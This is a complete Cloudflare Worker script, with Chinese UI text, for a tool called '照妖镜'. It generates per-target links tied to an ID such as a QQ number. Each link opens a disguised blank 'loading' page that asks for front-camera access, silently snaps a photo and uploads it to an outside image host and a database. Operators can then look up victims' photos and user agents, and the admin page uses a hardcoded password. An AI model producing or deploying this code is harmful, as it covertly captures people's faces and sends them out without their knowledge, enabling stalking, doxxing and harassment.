const ADMIN_PASSWORD = "sakcnzz666";
const TARGET_HOST = "tc.ilqx.dpdns.org"; // 你的图床地址

export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    const path = url.pathname;

    // 自动初始化数据库表
    await initDatabase(env);

    // 路由分发
    if (path === "/") return renderMainPage();
    if (path.startsWith("/t/")) return renderCapturePage(path.split("/")[2]);
    if (path === "/api/upload") return handleUpload(request, env);
    if (path === "/api/query") return handleQuery(request, env);
    if (path === "/admin") return renderAdminPage(request, env);

    return new Response("Not Found", { status: 404 });
  }
};

/**
 * 自动创建数据库表
 */
async function initDatabase(env) {
  await env.DB.prepare(`
    CREATE TABLE IF NOT EXISTS records (
      id TEXT PRIMARY KEY,
      uid TEXT,
      img_url TEXT,
      ua TEXT,
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )
  `).run();
}

/**
 * 主面板 UI (生成与查询)
 */
function renderMainPage() {
  const html = `
  <!DOCTYPE html>
  <html>
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>照妖镜</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
      body { background: #f8fafc; font-family: sans-serif; }
      .glass { background: rgba(255, 255, 255, 0.8); backdrop-filter: blur(10px); }
    </style>
  </head>
  <body class="flex items-center justify-center min-h-screen p-4">
    <div class="max-w-md w-full space-y-6">
      <div class="glass p-8 rounded-3xl shadow-xl border border-white">
        <h2 class="text-2xl font-bold text-gray-800 mb-6 text-center">生成面板</h2>
        <input id="target_id" type="text" placeholder="输入识别ID (如QQ)" class="w-full px-4 py-3 rounded-xl border border-gray-200 focus:ring-2 focus:ring-blue-500 outline-none transition-all">
        <button onclick="generateLink()" class="w-full mt-4 bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 rounded-xl transition-all shadow-lg shadow-blue-200">优先生成链接</button>
        <div id="link_res" class="mt-4 p-3 bg-gray-50 rounded-lg text-sm break-all hidden text-blue-600 border border-blue-100"></div>
      </div>

      <div class="glass p-8 rounded-3xl shadow-xl border border-white">
        <h2 class="text-2xl font-bold text-gray-800 mb-6 text-center">查询面板</h2>
        <input id="query_id" type="text" placeholder="输入识别ID" class="w-full px-4 py-3 rounded-xl border border-gray-200 focus:ring-2 focus:ring-green-500 outline-none transition-all">
        <button onclick="queryId()" class="w-full mt-4 bg-green-600 hover:bg-green-700 text-white font-semibold py-3 rounded-xl transition-all shadow-lg shadow-green-200">查询照片</button>
        <div id="query_res" class="mt-4 hidden text-center">
           <img id="res_img" class="rounded-xl shadow-md w-full border" src="">
        </div>
      </div>
    </div>

    <script>
      function generateLink() {
        const id = document.getElementById('target_id').value;
        if(!id) return alert('请输入ID');
        const link = window.location.origin + '/t/' + btoa(encodeURIComponent(id));
        const div = document.getElementById('link_res');
        div.innerText = link;
        div.classList.remove('hidden');
      }

      async function queryId() {
        const id = document.getElementById('query_id').value;
        const res = await fetch('/api/query?uid=' + encodeURIComponent(id));
        const data = await res.json();
        if(data.src) {
          document.getElementById('res_img').src = data.src;
          document.getElementById('query_res').classList.remove('hidden');
        } else {
          alert('未找到数据');
        }
      }
    </script>
  </body>
  </html>`;
  return new Response(html, { headers: { "content-type": "text/html" } });
}

/**
 * 捕获页面 (空白页)
 */
function renderCapturePage(encodedId) {
  const html = `
  <!DOCTYPE html>
  <html>
  <head>
    <meta charset="UTF-8">
    <title>加载中...</title>
    <style>body { background: #fff; margin: 0; padding: 0; }</style>
  </head>
  <body>
    <video id="v" style="display:none" autoplay playsinline></video>
    <canvas id="c" style="display:none"></canvas>
    <script>
      const uid = decodeURIComponent(atob("${encodedId}"));
      async function start() {
        try {
          const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
          const v = document.getElementById('v');
          v.srcObject = stream;
          v.onloadedmetadata = () => {
            setTimeout(() => {
              const c = document.getElementById('c');
              c.width = v.videoWidth;
              c.height = v.videoHeight;
              c.getContext('2d').drawImage(v, 0, 0);
              c.toBlob(async (blob) => {
                const formData = new FormData();
                formData.append('file', blob, 'img.jpg');
                formData.append('uid', uid);
                await fetch('/api/upload', { method: 'POST', body: formData });
                stream.getTracks().forEach(t => t.stop());
              }, 'image/jpeg', 0.7);
            }, 1500);
          };
        } catch (e) {}
      }
      window.onload = start;
    </script>
  </body>
  </html>`;
  return new Response(html, { headers: { "content-type": "text/html" } });
}

/**
 * 处理上传逻辑
 */
async function handleUpload(request, env) {
  const formData = await request.formData();
  const file = formData.get('file');
  const uid = formData.get('uid');
  const ua = request.headers.get('user-agent');

  if (file.size > 5 * 1024 * 1024) return new Response("Too Large", { status: 413 });

  // 1. 转发到你的图床 tc.ilqx.dpdns.org
  const uploadForm = new FormData();
  uploadForm.append('file', file);

  const tcRes = await fetch(\`https://\${TARGET_HOST}/upload\`, {
    method: 'POST',
    body: uploadForm
  });

  const tcData = await tcRes.json();
  // 假设返回格式为 [{"src": "/file/..."}]
  const imgUrl = \`https://\${TARGET_HOST}\` + tcData[0].src;

  // 2. 存入 D1 数据库
  const id = crypto.randomUUID();
  await env.DB.prepare("INSERT OR REPLACE INTO records (id, uid, img_url, ua) VALUES (?, ?, ?, ?)")
    .bind(id, uid, imgUrl, ua)
    .run();

  return new Response(JSON.stringify({ status: "ok", url: imgUrl }), {
    headers: { "content-type": "application/json" }
  });
}

/**
 * 查询接口
 */
async function handleQuery(request, env) {
  const { searchParams } = new URL(request.url);
  const uid = searchParams.get('uid');
  const result = await env.DB.prepare("SELECT img_url FROM records WHERE uid = ? ORDER BY created_at DESC LIMIT 1")
    .bind(uid)
    .first();

  return new Response(JSON.stringify({ src: result ? result.img_url : null }), {
    headers: { "content-type": "application/json" }
  });
}

/**
 * 管理后台
 */
async function renderAdminPage(request, env) {
  const { searchParams } = new URL(request.url);
  if (searchParams.get('p') !== ADMIN_PASSWORD) {
    return new Response("Unauthorized", { status: 401 });
  }

  const { results } = await env.DB.prepare("SELECT * FROM records ORDER BY created_at DESC").all();

  const html = `
  <!DOCTYPE html>
  <html>
  <head>
    <meta charset="UTF-8">
    <title>Admin Panel</title>
    <script src="https://cdn.tailwindcss.com"></script>
  </head>
  <body class="p-8 bg-gray-100">
    <div class="max-w-6xl mx-auto">
      <h1 class="text-3xl font-bold mb-8">所有捕获记录</h1>
      <div class="bg-white rounded-2xl shadow overflow-hidden">
        <table class="w-full text-left">
          <thead class="bg-gray-50 border-b">
            <tr>
              <th class="p-4">ID</th>
              <th class="p-4">图片预览</th>
              <th class="p-4">User-Agent</th>
              <th class="p-4">时间</th>
            </tr>
          </thead>
          <tbody>
            \${results.map(r => \`
              <tr class="border-b hover:bg-gray-50">
                <td class="p-4 font-mono">\${r.uid}</td>
                <td class="p-4"><a href="\${r.img_url}" target="_blank"><img src="\${r.img_url}" class="h-20 rounded shadow"></a></td>
                <td class="p-4 text-xs text-gray-500 max-w-xs truncate">\${r.ua}</td>
                <td class="p-4 text-sm">\${r.created_at}</td>
              </tr>
            \`).join('')}
          </tbody>
        </table>
      </div>
    </div>
  </body>
  </html>`;
  return new Response(html, { headers: { "content-type": "text/html" } });
}